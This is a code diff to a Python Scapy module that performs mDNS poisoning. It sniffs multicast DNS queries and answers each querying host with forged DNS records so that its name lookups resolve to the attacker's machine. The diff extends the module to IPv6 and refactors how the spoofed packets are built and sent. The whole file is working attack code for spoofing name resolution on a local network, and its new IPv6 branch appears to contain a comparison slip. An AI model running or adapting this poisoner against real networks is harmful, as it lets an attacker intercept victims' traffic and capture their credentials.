@@ -2,22 +2,27 @@
 # -*- coding: utf-8 -*-
 
 
-from scapy.all import DNSRR, DNS, Ether, IP, UDP, sendp, sniff, packet
-from threading import Event
-
-import time
+from scapy.all import DNSRR, DNS, Ether, IP, UDP, sendp, sniff, packet, IPv6
 from .poisoninfo import PoisonNetworkInfo
-import argparse
 
 
 class MDNS(PoisonNetworkInfo):
-    def __init__(self, ip: str, mac_address: str, iface: str):
-        super().__init__(ip, mac_address, iface)
+    def __init__(self, ip: str, ipv6: str, mac_address: str, iface: str):
+        super().__init__(ip, ipv6, mac_address, iface)
         self._targets_used = []
+        self._mdns_poisoner_process = None
 
     @property
     def targets_used(self):
         return self._targets_used
+
+    @property
+    def mdns_poisoner_process(self):
+        return self._mdns_poisoner_process
+
+    @mdns_poisoner_process.setter
+    def mdns_poisoner_process(self, process):
+        self._mdns_poisoner_process = process
 
     def dns_record(self, pkt: packet) -> DNSRR:
         return DNSRR(
@@ -39,12 +44,18 @@ class MDNS(PoisonNetworkInfo):
                 return
             response /= IP(dst=pkt[IP].src)
             ip_of_the_packet = pkt[IP].src
-        return ip_of_the_packet
+        if IPv6 in pkt:
+            if pkt[IP].src == self.ipv6:
+                return
+            response /= IPv6(dst=pkt[IPv6].src)
+            ip_of_the_packet = pkt[IPv6].src
+        return response, ip_of_the_packet
 
-    def transport_layer(self, response: packet) -> None:
+    def transport_layer(self, response: packet) -> packet:
         response /= UDP(sport="mdns", dport="mdns")
+        return response
 
-    def application_layer(self, pkt: packet, response: packet) -> None:
+    def application_layer(self, pkt: packet, response: packet) -> packet:
         response /= DNS(
             id=pkt[DNS].id,
             qr=1,
@@ -61,41 +72,36 @@ class MDNS(PoisonNetworkInfo):
             ns=None,
             ar=None,
         )
+        return response
 
     def send_packet(self, response: packet, ip_of_the_packet: str) -> None:
         if ip_of_the_packet not in self.targets_used:
             print("Sending packet to " + ip_of_the_packet)
+            response.show()
             sendp(response, verbose=False)
             self.targets_used.append(ip_of_the_packet)
 
     def filter_for_mdns(self, pkt: packet) -> bool:
-        return (
-            pkt.haslayer(UDP)
-            and pkt[UDP].sport == 5353
-            and pkt.haslayer(DNS)
-            and pkt.haslayer(IP)
-            and pkt[DNS].qd is not None
-        )
+        return pkt.haslayer(DNS) and pkt.haslayer(IP) and pkt[DNS].qd is not None
 
     def mdns_checking_packets(self, pkt: packet) -> None:
         if self.filter_for_mdns(pkt):
             response = self.data_link_layer(pkt)
-            ip_of_the_packet = self.network_layer(pkt, response)
-            self.transport_layer(response)
-            self.application_layer(pkt, response)
+            response, ip_of_the_packet = self.network_layer(pkt, response)
+            response = self.transport_layer(response)
+            response = self.application_layer(pkt, response)
             self.send_packet(response, ip_of_the_packet)
 
-    def start_mdns_poisoning(self, stop_event: Event) -> None:
+    def start_mdns_poisoning(self) -> None:
         # Port of mdns 5353
+        # filter="udp and port mdns",
         print("Starting MDNSPoisoner...")
         sniff(
-            # filter="udp and port mdns",
+            filter="udp and port mdns",
             iface=self.iface,
             prn=self.mdns_checking_packets,
             store=0,
-            stop_filter=lambda p: stop_event.is_set(),
         )
-        
 
     def cleaner(self):
         print("Empezando sleeper...")
